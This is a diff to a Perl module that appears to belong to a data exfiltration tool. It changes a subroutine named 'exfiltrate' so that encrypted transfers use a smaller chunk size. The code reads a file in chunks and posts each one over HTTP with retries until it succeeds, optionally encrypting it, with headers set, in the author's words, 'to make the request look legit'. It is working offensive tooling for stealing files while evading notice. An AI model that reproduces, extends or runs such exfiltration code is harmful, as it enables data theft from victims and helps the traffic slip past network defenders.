@@ -17,10 +17,11 @@ use LWP::UserAgent;
 use JSON::MaybeXS;
 use Term::ProgressBar;
 
-use constant START_TRANSFER => 1;
-use constant IN_TRANSFER    => 0;
-use constant END_TRANSFER   => -1;
-use constant LIMIT_TRANFER  => 4000;
+use constant START_TRANSFER     =>  1;
+use constant IN_TRANSFER        =>  0;
+use constant END_TRANSFER       =>  -1;
+use constant LIMIT_TRANFER      =>  4000;
+use constant ENC_LIMIT_TRANFER  =>  2000;
 
 #
 # Set the header fields to make the request look legit.
@@ -52,7 +53,7 @@ sub sendData {
         state   =>  $state
     };
 
-    $request->content($self->encryptionKey ? $self->SUPER::encrypt(encode_json $hash) : encode_json($hash));
+    $request->content($self->encryptionKey ? $self->SUPER::encrypt(encode_json $hash) : encode_json $hash);
 
     while (!$res || $res->code != 200) {
         $res = $userAgent->request($request);
@@ -79,8 +80,13 @@ sub exfiltrate {
 
     sendData($self, $request, $userAgent, $file, '', $id, START_TRANSFER);
 
+    if ($self->encryptionKey) {
+        $size = $self->size <= ENC_LIMIT_TRANFER ? $self->size : ENC_LIMIT_TRANFER;
+    } else {
+        $size = $self->size <= LIMIT_TRANFER ? $self->size : LIMIT_TRANFER;
+    }
+
     $count = 0;
-    $size = $self->size <= LIMIT_TRANFER ? $self->size : LIMIT_TRANFER;
     while (($n = read $self->file, $data, $size) != 0) {
         $count += $n;
         sendData($self, $request, $userAgent, $file, $data, $id, IN_TRANSFER);
